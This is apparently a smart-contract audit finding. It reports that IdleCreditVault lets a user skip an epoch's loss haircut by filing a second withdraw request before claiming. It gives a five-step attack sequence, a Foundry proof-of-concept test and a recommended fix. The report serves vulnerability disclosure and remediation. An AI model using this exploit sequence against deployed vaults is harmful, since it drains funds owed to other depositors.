### Title
Stale withdraw receipt escapes epoch-scoped loss haircut by re-requesting before claim - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault` tracks the haircut for a loss-adjusted epoch per request epoch (`lossRecoveryPriceByEpoch`), but only looks up the haircut via `lastWithdrawRequest[_user]`. If a user makes a new `requestWithdraw` after a loss epoch but before claiming, `lastWithdrawRequest` is overwritten and the haircutted epoch's basis merges into the aggregate `withdrawsRequests[_user]`, which `_claimFundedWithdrawRequest` later pays at par. The strategy only ever received the haircutted amount for the old receipt, so the user withdraws the un-booked loss difference directly out of funds reserved for other claimants.

### Finding Description
`requestWithdraw` sets `lastWithdrawRequest[_user] = currentEpoch` and accumulates the request into the aggregate `withdrawsRequests[_user]` and the per-epoch `withdrawsRequestsByEpoch[_user][currentEpoch]` (IdleCreditVault.sol:279-293).

When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` is called with `_amount < pendingBasis`: it stores `lossRecoveryPriceByEpoch[epochNumber]` and resets `pendingWithdraws` to 0 while pulling only the haircutted amount (IdleCreditVault.sol:411-421).

On claim, `_claimLossAdjustedWithdrawRequest` only applies the haircut when `lastWithdrawRequest[_user]` equals a loss epoch (IdleCreditVault.sol:789-800). If the user requested again in a later epoch, `lastWithdrawRequest` points to the new epoch, `lossRecoveryPriceByEpoch[newEpoch]` is 0, and the loss claim path is skipped. `_claimFundedWithdrawRequest` then pays the entire aggregate `withdrawsRequests[_user]` (old haircutted basis + new basis) at par once `epochNumber > lastWithdrawRequest[_user]` (IdleCreditVault.sol:326-349).

The epoch-N basis was never removed from `withdrawsRequests[_user]` — `_clearWithdrawClaimForEpoch` is never invoked for epoch N because the loss-claim path is bypassed. The old receipt is effectively a "freed" (already loss-settled) claim that is reused at full value, mirroring the use-after-free pattern of CVE-2017-8929: state cleared/settled under one epoch's rules is dereferenced again under another's.

### Impact Explanation
Direct theft / insolvency. The attacker receives `N_basis * (1 - lossRecoveryPrice)` more underlying than the strategy collected for that receipt. Since strategy underlyings are a shared pool backing all funded receipts and the default recovery reserve, the excess is paid from other users' claims — the last claimants revert on insufficient balance (`_transferFundedClaim` guard only protects `defaultRecoveryReserve`, not other funded receipts). Loss scales linearly with the haircutted receipt size and the realized loss percentage.

### Likelihood Explanation
Fully attacker-controlled sequence, no privileged cooperation:
1. Epoch N buffer: attacker `requestWithdraw` (any tranche-token holder).
2. Honest manager calls `stopEpochWithDuration` with `_lossAmount > 0` (a normal borrower-loss path, not a default — no freeze).
3. Epoch N+1 buffer: attacker `requestWithdraw` again, overwriting `lastWithdrawRequest`.
4. Epoch N+1 stops normally, funding the new pending bucket at par.
5. Attacker (via CDO `claimWithdrawRequest`) drains the aggregate at par.

The only precondition is a `stopEpochWithDuration` loss epoch, which is a supported honest flow. No guards stop it: `pendingClaims`, epoch gating, `_transferFundedClaim` reserve check, and KYC/`isWalletAllowed` are all satisfied by a KYC'd lender.

### Recommendation
Track loss-adjusted receipts per epoch instead of via `lastWithdrawRequest`. In `_claimFundedWithdrawRequest` (or before it), iterate or check `withdrawsRequestsByEpoch[_user][e]` for any `lossRecoveryPriceByEpoch[e] != 0` and route that portion through the haircut; alternatively, revert in `requestWithdraw` when `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]] != 0` and the old receipt is unclaimed, or store a per-user mapping `lossEpochs[user]` cleared on claim.

### Proof of Concept
Foundry fork sketch (mirroring `test/foundry/IdleCreditVault.t.sol` helpers such as `_stopCurrentEpochWithApr` and the loss-adjusted test at `test/foundry/IdleCDOEpochQueue.t.sol:811-858`):

```solidity
// Setup: attacker is KYC'd, deposits `amount` into AA tranche.
uint256 amount = 100_000e6;
idleCDO.depositAA(amount);

// --- Epoch N buffer: request withdraw of all tranches ---
cdoEpoch.requestWithdraw(tranche.balanceOf(attacker), address(tranche));
uint256 lossEpoch = strategy.epochNumber(); // e.g. 1

// Epoch N runs; borrower repays with realized loss.
vm.prank(manager);
cdoEpoch.startEpoch();
vm.warp(cdoEpoch.epochEndDate() + 1);

uint256 pendingBasis = strategy.pendingWithdraws();           // == attacker basis
uint256 activeBasis  = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
uint256 totalBasis   = activeBasis + pendingBasis;
uint256 lossAmount   = totalBasis / 10;                        // 10% loss
(uint256 pendingToFund,) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
deal(underlying, borrower, repay);
vm.startPrank(borrower);
underlying.approve(address(cdoEpoch), repay);
vm.stopPrank();
vm.prank(manager);
cdoEpoch.stopEpochWithDuration(apr, 0, duration, lossAmount); // sets lossRecoveryPriceByEpoch[lossEpoch]
// strategy only collected pendingToFund < pendingBasis

// --- Epoch N+1 buffer: attacker requests a tiny second withdraw ---
// this overwrites lastWithdrawRequest[attacker] -> lossEpoch+1
cdoEpoch.requestWithdraw(1, address(tranche));

// Epoch N+1 runs and stops normally; borrower funds the new bucket at par.
vm.prank(manager); cdoEpoch.startEpoch();
vm.warp(cdoEpoch.epochEndDate() + 1);
fundBorrowerAndApprove(strategy.pendingWithdraws() + cdoEpoch.expectedEpochInterest());
vm.prank(manager); cdoEpoch.stopEpoch(apr, 0);

// epochNumber > lastWithdrawRequest now -> funded path pays aggregate at par
uint256 balPre = underlying.balanceOf(attacker);
cdoEpoch.claimWithdrawRequest();
uint256 paid = underlying.balanceOf(attacker) - balPre;

// Expected fair payout: pendingBasis * lossPrice/1e18 + 1
// Actual payout:       pendingBasis + 1  (loss haircut bypassed)
assertGt(paid, pendingBasis * strategy.lossRecoveryPriceByEpoch(lossEpoch) / 1e18 + 1);
```

The excess `paid - fairPayout` equals the un-applied loss share, withdrawn from underlyings owed to other funded receipts/reserve claimants.
